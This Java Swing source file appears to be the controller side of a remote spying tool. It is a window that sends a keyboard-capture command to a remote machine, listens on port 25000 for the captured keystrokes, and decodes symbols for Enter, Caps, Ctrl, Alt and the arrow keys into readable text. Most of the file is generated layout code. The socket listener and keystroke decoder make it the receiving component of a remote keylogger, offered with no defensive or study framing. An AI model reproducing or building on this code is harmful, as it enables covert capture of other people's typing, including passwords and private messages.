/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Window;

import Connection.Command;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;

/**
 *
 * @author abaza
 */
public class frmKeybord extends javax.swing.JInternalFrame {

    private static Socket socket = null;
    private MainGUI Class = null;
    private String Result = null;

    public frmKeybord(MainGUI Class) throws IOException {
        initComponents();
        this.Class = Class;
        this.Class.Connect(Command.KEYBORD);
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jScrollPane1 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();
        jButton1 = new javax.swing.JButton();
        jButton2 = new javax.swing.JButton();
        led1 = new eu.hansolo.steelseries.extras.Led();

        setClosable(true);
        setIconifiable(true);
        addInternalFrameListener(new javax.swing.event.InternalFrameListener() {
            public void internalFrameOpened(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameClosing(javax.swing.event.InternalFrameEvent evt) {
                formInternalFrameClosing(evt);
            }
            public void internalFrameClosed(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameIconified(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameDeiconified(javax.swing.event.InternalFrameEvent evt) {
            }
            public void internalFrameActivated(javax.swing.event.InternalFrameEvent evt) {
                formInternalFrameActivated(evt);
            }
            public void internalFrameDeactivated(javax.swing.event.InternalFrameEvent evt) {
            }
        });

        jTextArea1.setEditable(false);
        jTextArea1.setColumns(20);
        jTextArea1.setLineWrap(true);
        jTextArea1.setRows(5);
        jScrollPane1.setViewportView(jTextArea1);

        jButton1.setText("Print");

        jButton2.setText("Save");

        led1.setLedColor(eu.hansolo.steelseries.tools.LedColor.BLUE_LED);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane1)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(led1, javax.swing.GroupLayout.PREFERRED_SIZE, 39, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 424, Short.MAX_VALUE)
                .addComponent(jButton2, javax.swing.GroupLayout.PREFERRED_SIZE, 175, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 171, javax.swing.GroupLayout.PREFERRED_SIZE))
        );

        layout.linkSize(javax.swing.SwingConstants.HORIZONTAL, new java.awt.Component[] {jButton1, jButton2});

        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 372, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jButton2, javax.swing.GroupLayout.PREFERRED_SIZE, 47, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jButton1, javax.swing.GroupLayout.PREFERRED_SIZE, 47, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(led1, javax.swing.GroupLayout.PREFERRED_SIZE, 37, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap())
        );

        layout.linkSize(javax.swing.SwingConstants.VERTICAL, new java.awt.Component[] {jButton1, jButton2, led1});

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void formInternalFrameClosing(javax.swing.event.InternalFrameEvent evt) {//GEN-FIRST:event_formInternalFrameClosing
        this.Class.Connect(Command.STOP_KEYBORD);

    }//GEN-LAST:event_formInternalFrameClosing
    public void resetResult() {
        Result = null;
    }

    private String capitalize(final String line) {
        return Character.toUpperCase(line.charAt(0)) + line.substring(1).toLowerCase();
    }

    public void InsertText(String TextOrg) {
        led1.setLedOn(true);
        String Text = "";
        if (TextOrg.contains("↲")) {
            Text = TextOrg.replace("↲", "\n");
        }
        if (TextOrg.contains("▲")) {
            String CapText = TextOrg.substring(TextOrg.indexOf("▲") + 1);
            TextOrg = TextOrg.replace("▲", "");
            Text += capitalize(CapText);
        }
        if (TextOrg.contains("▰")) {
            String tmp = TextOrg.replace("▰", "");
            Text += tmp.toUpperCase();
        }
        if (TextOrg.contains("↹")) {
            Text += TextOrg.replace("↹", "      ");
        }
        if (TextOrg.contains("↑")) {
            Text += "[↑]";
        }
        if (TextOrg.contains("↓")) {
            Text += "[↓]";
        }
        if (TextOrg.contains("→")) {
            Text += "[→]";
        }
        if (TextOrg.contains("←")) {
            Text += "[←]";
        }
        if (TextOrg.contains("↞")) {
            TextOrg = TextOrg.replace("↞", "");
            Text += "↞";
        }
        if (TextOrg.contains("⊕+")) {
            Text += TextOrg.replace("⊕+", "Ctrl+");
        }
        if (TextOrg.contains("⊗+")) {
            Text += TextOrg.replace("⊗+", "Alt+");
        }
        if (TextOrg.contains(".")) {
//            Text += TextOrg.substring(TextOrg.indexOf("."));
            Text += ".";
        }

        String CText = jTextArea1.getText();
        jTextArea1.setText("");
        if (!Text.isEmpty()) {
            jTextArea1.setText(CText + Text.trim() + " ");
        } else {
            jTextArea1.setText(CText + TextOrg.trim() + " ");
        }
        led1.setLedOn(false);
    }
    private void formInternalFrameActivated(javax.swing.event.InternalFrameEvent evt) {//GEN-FIRST:event_formInternalFrameActivated
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        socket = new ServerSocket(25000).accept();
                        InputStream is = socket.getInputStream();
                        InputStreamReader isr = new InputStreamReader(is);
                        BufferedReader br = new BufferedReader(isr);
                        Result = br.readLine();
                        InsertText(Result);
                        resetResult();
                    } catch (IOException ex) {
                    } finally {
                        try {
                            if (socket != null) {
                                socket.close();
                                socket = null;
                            } else {
                                continue;
                            }
                        } catch (Exception e) {
                        }
                    }
                }
            }
        }).start();
    }//GEN-LAST:event_formInternalFrameActivated


    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton jButton1;
    private javax.swing.JButton jButton2;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JTextArea jTextArea1;
    private eu.hansolo.steelseries.extras.Led led1;
    // End of variables declaration//GEN-END:variables
}
